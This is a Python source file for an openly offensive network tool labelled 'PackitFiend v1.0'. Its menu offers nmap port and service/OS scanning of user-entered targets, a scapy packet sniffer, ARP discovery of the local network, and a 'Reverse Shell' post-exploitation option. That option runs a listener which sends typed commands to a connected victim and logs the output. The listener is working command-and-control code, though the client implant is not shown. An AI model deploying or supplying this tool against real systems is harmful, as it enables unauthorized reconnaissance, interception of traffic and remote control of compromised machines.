
import pyfiglet 
from pyfiglet import Figlet
import socket
import os 
import sys
import time
from datetime import datetime
import scapy.all as scapy 
from scapy.all import sniff, IP
import struct
import ipaddress
from datetime import datetime
import subprocess
import platform
import threading
import queue
import json
import nmap

def scan_targets(targets, port_range, save_to_file=False):
    nm = nmap.PortScanner()

    for target in targets:
        try:
            print(f"Scanning target: {target} with port range {port_range}")
            nm.scan(target, port_range, arguments='-sV -O')
            print(f"Scan results for {target}:")
            print('-' * 50)

            for host in nm.all_hosts():
                print(f"Host: {host} ({nm[host].hostname()})")
                print(f"State: {nm[host].state()}")

                for proto in nm[host].all_protocols():
                    print("-" * 20)
                    print(f"Protocol: {proto}")

                    lport = list(nm[host][proto].keys())
                    lport.sort()
                    for port in lport:
                        port_info = nm[host][proto][port]
                        print(f"port: {port} \tstate: {port_info['state']} \tname: {port_info['name']} \tversion: {port_info.get('version', 'N/A')}")
                print('-' * 50)

                # Save results to a file if specified
                if save_to_file:
                    with open(f"scan_results_{target}.txt", "a") as file:
                        file.write(f"Host: {host} ({nm[host].hostname()})\n")
                        file.write(f"State: {nm[host].state()}\n")
                        for proto in nm[host].all_protocols():
                            file.write("-" * 20 + "\n")
                            file.write(f"Protocol: {proto}\n")
                            lport = list(nm[host][proto].keys())
                            lport.sort()
                            for port in lport:
                                port_info = nm[host][proto][port]
                                file.write(f"port: {port} \tstate: {port_info['state']} \tname: {port_info['name']} \tversion: {port_info.get('version', 'N/A')}\n")
                        file.write('-' * 50 + "\n")

        except socket.gaierror:
            print(f"Error: Unable to resolve target {target}")
        except nmap.PortScannerError as e:
            print(f"Error: Nmap scan failed for target {target}: {e}")
        except Exception as e:
            print(f"Unexpected error: {e}")

def packet_sniffer(target_ip, filter_expression, save_to_file=False):
    # Displays Current Target IP and Current time of scan
    print("Sniffing on target:", target_ip)
    print("-" * 50)  # Line
    print("Sniffing Target:", target_ip)
    print("Sniffing started at:", str(datetime.now()))
    print("-" * 50)  # Line

    def packet_callback(packet):
        if IP in packet:
            if packet[IP].dst == target_ip:
                print(f"Received packet: {packet.summary()}")
                if save_to_file:
                    with open("captured_packets.txt", "a") as file:
                        file.write(f"Received packet: {packet.summary()}\n")
            if packet[IP].src == target_ip:
                print(f"Sent packet: {packet.summary()}")
                if save_to_file:
                    with open("captured_packets.txt", "a") as file:
                        file.write(f"Sent packet: {packet.summary()}\n")
        else:
            print("Sniffing.....")
    try:
        sniff(prn=packet_callback, filter=filter_expression, store=0)
    except KeyboardInterrupt:
        print("\nExiting Sniffer...Returning to main menu")
        return main
    except Exception as e:
        print(f"An error occurred: {e}")
    return main

def get_default_network():
    # Get the default network (the network that the system is currently connected to)
    ip = socket.gethostbyname(socket.gethostname())
    net = ipaddress.IPv4Interface(f"{ip}/24").network  # Assume a /24 subnet mask
    return str(net)
def network_scanner(ip_range=None):
    if ip_range is None or ip_range.strip() == "":
        ip_range = get_default_network()
    print(f"Scanning network: {ip_range}")

    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(client_dict)
    return clients_list

def start_server(host='0.0.0.0', port=54321, save_to_file=False ):
    global conn
    global server
    global addr
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((host, port))
        server.listen(10)
        print(f"[*] Listening on {host}:{port}")

        conn, addr = server.accept()  # Wait for a client to connect
        print(f"[*] Connection from {addr}")

        while True:
            command = input(f"* Shell#{str(addr)}: ")
            if command == 'q':  # Exit condition for the shell
                break
            else:
                conn.send(command.encode())  # Send command to client
                message = conn.recv(4096).decode("utf-8")  # Receive output from client (adjust buffer size)
                if message:
                    print(f"[*] Command Output:{message}")  # Print the result
                    if save_to_file:
                        with open("session_log.txt", "a") as file:
                            file.write(f"Command: {command}\nOutput: {message}\n")
                else:
                    print("[!] No output received from client.")
    
    except Exception as e:
        print(f"Error: {e}")
    
    finally:
        if 'conn' in globals() and conn:
            conn.close()  # Ensure the connection is closed
        if 'server' in globals() and server:
            server.close()  # Ensure the server socket is also closed
            print("[*] Connection closed.")




# Banner and color formatting for user interface
RED = "\33[91m"
GREEN = "\033[32m"
END = "\033[0m"

banner = f"""
{GREEN}
██████╗  █████╗  ██████╗██╗  ██╗██╗████████╗███████╗██╗███████╗███╗   ██╗██████╗
██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║╚══██╔══╝██╔════╝██║██╔════╝████╗  ██║██╔══██╗
██████╔╝███████║██║     █████╔╝ ██║   ██║   █████╗  ██║█████╗  ██╔██╗ ██║██║  ██║
██╔═══╝ ██╔══██║██║     ██╔═██╗ ██║   ██║   ██╔══╝  ██║██╔══╝  ██║╚██╗██║██║  ██║
██║     ██║  ██║╚██████╗██║  ██╗██║   ██║   ██║     ██║███████╗██║ ╚████║██████╔╝
╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝ v1.0
"""
  
post_banner = f"""
{RED}
 ██▓███   ▄▄▄       ▄████▄   ██ ▄█▀ ██▓▄▄▄█████▓  █████▒██▓▓█████  ███▄    █ ▓█████▄ 
▓██░  ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓██▒▓  ██▒ ▓▒▓██   ▒▓██▒▓█   ▀  ██ ▀█   █ ▒██▀ ██▌
▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒██▒▒ ▓██░ ▒░▒████ ░▒██▒▒███   ▓██  ▀█ ██▒░██   █▌
▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░██░░ ▓██▓ ░ ░▓█▒  ░░██░▒▓█  ▄ ▓██▒  ▐▌██▒░▓█▄   ▌
▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░██░  ▒██▒ ░ ░▒█░   ░██░░▒████▒▒██░   ▓██░░▒████▓ 
▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░▓    ▒ ░░    ▒ ░   ░▓  ░░ ▒░ ░░ ▒░   ▒ ▒  ▒▒▓  ▒ 
░▒ ░       ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ▒ ░    ░     ░      ▒ ░ ░ ░  ░░ ░░   ░ ▒░ ░ ▒  ▒ 
░░         ░   ▒   ░        ░ ░░ ░  ▒ ░  ░       ░ ░    ▒ ░   ░      ░   ░ ░  ░ ░  ░ v1.0
               ░  ░░ ░      ░  ░    ░                   ░     ░  ░         ░    ░    
                   ░                                                          ░ 
"""

def main():
    while True:
        print(banner)  # Title Banner & Author Credentials
        author_banner = pyfiglet.figlet_format("Version 1.0  Author: LivinOFFtha_LAN", font='term')
        print(author_banner)

        print("Reconnaissance Options")
        print('-' * 100)
        print("\n 1. Port Scan")
        print("\n 2. Packet Sniffer")
        print("\n 3. Network Discovery")
        print(f"{RED}\n 4. Reverse Shell..?")
        print(f"{END}""\n 5. Exit")

        # Tool Menu and Script Options
        choice = input(f"{GREEN}Enter your selection: ")
        if choice == '1':
            targets = []
            while True:
                target = input("Enter a target address (or press Enter to finish): ")
                if target == "":
                    break
                targets.append(target)

            if not targets:
                print("No targets provided. Exiting.")
                return()
            port_range = input("Enter the port range to scan (e.g., 1-1024): ")
            save_to_file = input("Do you want to save the results to a file? (yes/no): ").strip().lower() == 'yes'
            scan_targets(targets, port_range, save_to_file)
        elif choice == '2':
            target_ip = input("Enter the target IP address: ")
            filter_expression = input("Enter the filter expression (e.g., 'ip'): ")
            save_to_file = input("Do you want to save the captured packets to a file? (yes/no): ").strip().lower() == 'yes'
            packet_sniffer(target_ip, filter_expression, save_to_file)
        elif choice == '3':
            ip_range = input("Enter the IP range to scan (e.g., 10.168.1.0/24), or press Enter to scan the current network: ")
            network_scanner(ip_range)
        elif choice == '4':
            print(post_banner)
            print(author_banner)
            print(f"{RED}Entering Post-Exploitation Menu...")
            host = input("Enter the host address (default: 0.0.0.0): ") or '0.0.0.0'
            port = int(input("Enter the port number (default: 54321): ") or 54321)
            save_to_file = input("Do you want to save the session logs to a file? (yes/no): ").strip().lower() == 'yes'
            start_server(host, port, save_to_file)
        elif choice == '5':
            print(f"{END}Exiting Menu...")
            sys.exit()

if __name__ == "__main__":
    main()